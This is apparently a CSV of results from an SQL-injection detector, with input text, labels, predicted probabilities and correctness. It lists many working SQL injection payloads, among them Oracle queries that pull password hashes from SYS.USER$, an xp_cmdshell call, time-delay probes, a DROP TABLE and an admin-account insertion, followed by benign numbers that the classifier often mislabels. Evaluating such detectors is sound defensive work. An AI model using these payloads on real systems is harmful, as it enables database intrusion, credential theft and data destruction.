text,source,true_label,pred_label,prob_sqli,correct
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999754428863525,1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',sajid576/sql-injection-dataset,1,1,0.9999799728393555,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999728202819824,1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,sajid576/sql-injection-dataset,1,1,0.9999786615371704,1
or uid like '%,sajid576/sql-injection-dataset,1,1,0.9999773502349854,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999744892120361,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999754428863525,1
)    )    or    (    (   'x'   )    )     =     (    (   'x,sajid576/sql-injection-dataset,1,1,0.9999769926071167,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999755620956421,1
; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,sajid576/sql-injection-dataset,1,1,0.9999816417694092,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999727010726929,1
"union select * from users where login   =   char  (  114,111,111,116  )  ;",sajid576/sql-injection-dataset,1,1,0.9999796152114868,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999727010726929,1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,sajid576/sql-injection-dataset,1,1,0.9999762773513794,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999754428863525,1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,sajid576/sql-injection-dataset,1,1,0.99997878074646,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999755620956421,1
sleep 50',sajid576/sql-injection-dataset,1,1,0.9999583959579468,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999755620956421,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999728202819824,1
"and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",sajid576/sql-injection-dataset,1,1,0.9999797344207764,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999746084213257,1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,sajid576/sql-injection-dataset,1,1,0.9999759197235107,1
or '' ',sajid576/sql-injection-dataset,1,1,0.9999756813049316,1
; drop table temp --,sajid576/sql-injection-dataset,1,1,0.9999680519104004,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999746084213257,1
or 'something' like 'some%',sajid576/sql-injection-dataset,1,1,0.9999728202819824,1
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,sajid576/sql-injection-dataset,1,1,0.9999806880950928,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999746084213257,1
; exec master..xp_cmdshell 'ping 10.10.1.2'--,sajid576/sql-injection-dataset,1,1,0.9999550580978394,1
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --,sajid576/sql-injection-dataset,1,1,0.9999806880950928,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999756813049316,1
"union   (  select NULL,   (  select @@version   )    )    --",sajid576/sql-injection-dataset,1,1,0.9999791383743286,1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,sajid576/sql-injection-dataset,1,1,0.9999785423278809,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999754428863525,1
"|| myappadmin.adduser  (  'admin', 'newpass'  )   || '",sajid576/sql-injection-dataset,1,1,0.9999809265136719,1
)   or true--,sajid576/sql-injection-dataset,1,1,0.9999784231185913,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999744892120361,1
or userid like '%,sajid576/sql-injection-dataset,1,1,0.9999767541885376,1
"union   (  select NULL, NULL,   (  select @@version   )    )    --",sajid576/sql-injection-dataset,1,1,0.9999791383743286,1
union   (  select @@version  )   --,sajid576/sql-injection-dataset,1,1,0.9999803304672241,1
or ''^',sajid576/sql-injection-dataset,1,1,0.9999762773513794,1
"union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",sajid576/sql-injection-dataset,1,1,0.9999796152114868,1
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",sajid576/sql-injection-dataset,1,1,0.9999809265136719,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999755620956421,1
; begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >,sajid576/sql-injection-dataset,1,1,0.9999791383743286,1
"union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",sajid576/sql-injection-dataset,1,1,0.9999794960021973,1
or user like '%,sajid576/sql-injection-dataset,1,1,0.9999727010726929,1
or ''-',sajid576/sql-injection-dataset,1,1,0.9999730587005615,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999754428863525,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999755620956421,1
)   or   (  'x'  )    =    (  'x,sajid576/sql-injection-dataset,1,1,0.9999804496765137,1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,sajid576/sql-injection-dataset,1,1,0.9999759197235107,1
or ''&',sajid576/sql-injection-dataset,1,1,0.9999783039093018,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999755620956421,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999728202819824,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999744892120361,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999749660491943,1
or username like '%,sajid576/sql-injection-dataset,1,1,0.9999772310256958,1
or uname like '%,sajid576/sql-injection-dataset,1,1,0.9999740123748779,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999752044677734,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999727010726929,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999750852584839,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999727010726929,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999748468399048,1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  GRANTED_ROLE   )    )    FROM DBA_ROLE_PRIVS WHERE GRANTEE  =  SYS.LOGIN_USER   )    )    AND 'i'  =  'i,sajid576/sql-injection-dataset,1,1,0.9999741315841675,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999747276306152,1
"union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --",sajid576/sql-injection-dataset,1,1,0.9999792575836182,1
or ''*',sajid576/sql-injection-dataset,1,1,0.99997878074646,1
sqlattempt1,sajid576/sql-injection-dataset,1,1,0.9968648552894592,1
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",sajid576/sql-injection-dataset,1,1,0.9999809265136719,1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  PASSWORD   )    )    FROM SYS.USER$   )    )    AND 'i'  =  'i,sajid576/sql-injection-dataset,1,1,0.9999756813049316,1
or username is not NULL or username   =   ',sajid576/sql-injection-dataset,1,1,0.99997878074646,1
and 1  =  0  )   union all,sajid576/sql-injection-dataset,1,1,0.9999786615371704,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999728202819824,1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",sajid576/sql-injection-dataset,1,1,0.9999749660491943,1
3.54937E+15,sajid576/sql-injection-dataset,0,1,0.9983832836151123,0
3.4008E+15,sajid576/sql-injection-dataset,0,1,0.9995418787002563,0
8.36404E+15,sajid576/sql-injection-dataset,0,1,0.9983237385749817,0
4.20136E+14,sajid576/sql-injection-dataset,0,1,0.9997628331184387,0
5.71439E+15,sajid576/sql-injection-dataset,0,1,0.9976708292961121,0
5240,sajid576/sql-injection-dataset,0,0,1.9375820556888357e-05,1
8.61689E+15,sajid576/sql-injection-dataset,0,1,0.9975300431251526,0
9.48E+15,sajid576/sql-injection-dataset,0,1,0.9991699457168579,0
5.83899E+15,sajid576/sql-injection-dataset,0,1,0.997688889503479,0
1.76488E+15,sajid576/sql-injection-dataset,0,1,0.9996852874755859,0
3.81894E+15,sajid576/sql-injection-dataset,0,1,0.999194324016571,0
6.65741E+15,sajid576/sql-injection-dataset,0,1,0.9988710284233093,0
3.98E+15,sajid576/sql-injection-dataset,0,1,0.9997568726539612,0
8.5138E+15,sajid576/sql-injection-dataset,0,1,0.9986169338226318,0
9.84215E+15,sajid576/sql-injection-dataset,0,1,0.9989681243896484,0
5.88977E+15,sajid576/sql-injection-dataset,0,1,0.9977461695671082,0
8.85119E+15,sajid576/sql-injection-dataset,0,1,0.9984967708587646,0
4.13841E+15,sajid576/sql-injection-dataset,0,1,0.9996206760406494,0
1.44E+15,sajid576/sql-injection-dataset,0,1,0.9998537302017212,0
1.07544E+15,sajid576/sql-injection-dataset,0,1,0.9991191029548645,0
6.05128E+15,sajid576/sql-injection-dataset,0,1,0.9991365075111389,0
6.03007E+15,sajid576/sql-injection-dataset,0,1,0.9995946288108826,0
9.26768E+15,sajid576/sql-injection-dataset,0,1,0.9982045888900757,0
8.96125E+15,sajid576/sql-injection-dataset,0,1,0.9977654218673706,0
6.90524E+15,sajid576/sql-injection-dataset,0,1,0.9984835982322693,0
8170,sajid576/sql-injection-dataset,0,0,1.9154729670844972e-05,1
8349,sajid576/sql-injection-dataset,0,0,1.929064092109911e-05,1
4.5422E+15,sajid576/sql-injection-dataset,0,1,0.9996753931045532,0
1.35689E+15,sajid576/sql-injection-dataset,0,1,0.9995786547660828,0
6.69143E+14,sajid576/sql-injection-dataset,0,1,0.9990193843841553,0
2.75339E+15,sajid576/sql-injection-dataset,0,1,0.9980661273002625,0
3.67249E+15,sajid576/sql-injection-dataset,0,1,0.9989100694656372,0
2.22584E+14,sajid576/sql-injection-dataset,0,1,0.9995500445365906,0
6.71861E+15,sajid576/sql-injection-dataset,0,1,0.9986245632171631,0
1.02549E+15,sajid576/sql-injection-dataset,0,1,0.998590886592865,0
4560,sajid576/sql-injection-dataset,0,0,1.8904043827205896e-05,1
4.92079E+15,sajid576/sql-injection-dataset,0,1,0.9988595247268677,0
3.82074E+15,sajid576/sql-injection-dataset,0,1,0.9991439580917358,0
3.18663E+15,sajid576/sql-injection-dataset,0,1,0.9991071820259094,0
4176,sajid576/sql-injection-dataset,0,0,1.989225893339608e-05,1
5150,sajid576/sql-injection-dataset,0,0,1.9009221432497725e-05,1
1.06705E+14,sajid576/sql-injection-dataset,0,1,0.9997585415840149,0
3820,sajid576/sql-injection-dataset,0,0,1.9366067135706544e-05,1
7.28065E+15,sajid576/sql-injection-dataset,0,1,0.9983482360839844,0
8.00405E+14,sajid576/sql-injection-dataset,0,1,0.9983053207397461,0
6.27383E+15,sajid576/sql-injection-dataset,0,1,0.9987527132034302,0
2100,sajid576/sql-injection-dataset,0,0,3.577689494704828e-05,1
8.99091E+15,sajid576/sql-injection-dataset,0,1,0.9981340765953064,0
5.25502E+15,sajid576/sql-injection-dataset,0,1,0.998552143573761,0
6160,sajid576/sql-injection-dataset,0,0,1.9873636119882576e-05,1
4.61733E+15,sajid576/sql-injection-dataset,0,1,0.9994922876358032,0
4.47874E+15,sajid576/sql-injection-dataset,0,1,0.9995691180229187,0
5.9555E+15,sajid576/sql-injection-dataset,0,1,0.9987632036209106,0
3.21396E+15,sajid576/sql-injection-dataset,0,1,0.9992691874504089,0
4.46813E+15,sajid576/sql-injection-dataset,0,1,0.9994852542877197,0
3814,sajid576/sql-injection-dataset,0,0,1.9105582396150567e-05,1
5458,sajid576/sql-injection-dataset,0,0,1.9218863599235192e-05,1
1.13313E+15,sajid576/sql-injection-dataset,0,1,0.9997943043708801,0
8110,sajid576/sql-injection-dataset,0,0,1.9352186427568085e-05,1
8.2197E+15,sajid576/sql-injection-dataset,0,1,0.9988096952438354,0
3.07443E+15,sajid576/sql-injection-dataset,0,1,0.9997133612632751,0
7.05E+15,sajid576/sql-injection-dataset,0,1,0.9994547963142395,0
2.45746E+15,sajid576/sql-injection-dataset,0,1,0.9991656541824341,0
5.56439E+15,sajid576/sql-injection-dataset,0,1,0.9991844296455383,0
8.35555E+15,sajid576/sql-injection-dataset,0,1,0.998544454574585,0
4.08791E+15,sajid576/sql-injection-dataset,0,1,0.9992995262145996,0
5.07682E+15,sajid576/sql-injection-dataset,0,1,0.9978846907615662,0
6.5524E+15,sajid576/sql-injection-dataset,0,1,0.9992128610610962,0
6.24331E+15,sajid576/sql-injection-dataset,0,1,0.998831570148468,0
5230,sajid576/sql-injection-dataset,0,0,1.9266261006123386e-05,1
1.53418E+15,sajid576/sql-injection-dataset,0,1,0.9997290968894958,0
2.1902E+15,sajid576/sql-injection-dataset,0,1,0.9996229410171509,0
4.1265E+15,sajid576/sql-injection-dataset,0,1,0.9997486472129822,0
6.6591E+15,sajid576/sql-injection-dataset,0,1,0.9991631507873535,0
2.21E+15,sajid576/sql-injection-dataset,0,1,0.9999287128448486,0
8.34964E+15,sajid576/sql-injection-dataset,0,1,0.9970903396606445,0
5.58043E+15,sajid576/sql-injection-dataset,0,1,0.9980053305625916,0
2.30E+15,sajid576/sql-injection-dataset,0,1,0.9998779296875,0
4.89E+15,sajid576/sql-injection-dataset,0,1,0.9997789263725281,0
1.91636E+15,sajid576/sql-injection-dataset,0,1,0.9994532465934753,0
1.89129E+15,sajid576/sql-injection-dataset,0,1,0.9993178844451904,0
6.18738E+15,sajid576/sql-injection-dataset,0,1,0.9986155033111572,0
3.19291E+15,sajid576/sql-injection-dataset,0,1,0.9994563460350037,0
5192,sajid576/sql-injection-dataset,0,0,2.055038930848241e-05,1
9.5286E+15,sajid576/sql-injection-dataset,0,1,0.9980046153068542,0
5.17668E+15,sajid576/sql-injection-dataset,0,1,0.9989043474197388,0
1.20958E+14,sajid576/sql-injection-dataset,0,1,0.9994860887527466,0
9.0515E+15,sajid576/sql-injection-dataset,0,1,0.9991951584815979,0
4.85943E+15,sajid576/sql-injection-dataset,0,1,0.9994569420814514,0
7.09479E+15,sajid576/sql-injection-dataset,0,1,0.9979275465011597,0
9.12244E+15,sajid576/sql-injection-dataset,0,1,0.9981579184532166,0
8.55461E+15,sajid576/sql-injection-dataset,0,1,0.9980806112289429,0
6.64228E+14,sajid576/sql-injection-dataset,0,1,0.9993257522583008,0
3.4285E+15,sajid576/sql-injection-dataset,0,1,0.9997689127922058,0
9.00454E+15,sajid576/sql-injection-dataset,0,1,0.9978771209716797,0
3.85057E+14,sajid576/sql-injection-dataset,0,1,0.999293327331543,0
3.89191E+15,sajid576/sql-injection-dataset,0,1,0.9992607235908508,0
6.04089E+15,sajid576/sql-injection-dataset,0,1,0.9984691739082336,0
5.22E+15,sajid576/sql-injection-dataset,0,1,0.9995773434638977,0
4.78072E+15,sajid576/sql-injection-dataset,0,1,0.9993725419044495,0
1450,sajid576/sql-injection-dataset,0,0,1.8732695025391877e-05,1
4.27735E+15,sajid576/sql-injection-dataset,0,1,0.9988859295845032,0
4.10842E+15,sajid576/sql-injection-dataset,0,1,0.9990746974945068,0
5.44972E+15,sajid576/sql-injection-dataset,0,1,0.9990577101707458,0
6.60819E+15,sajid576/sql-injection-dataset,0,1,0.9986863732337952,0
4.94812E+15,sajid576/sql-injection-dataset,0,1,0.9996546506881714,0
8.04948E+15,sajid576/sql-injection-dataset,0,1,0.9980205297470093,0
2.78171E+15,sajid576/sql-injection-dataset,0,1,0.9991106390953064,0
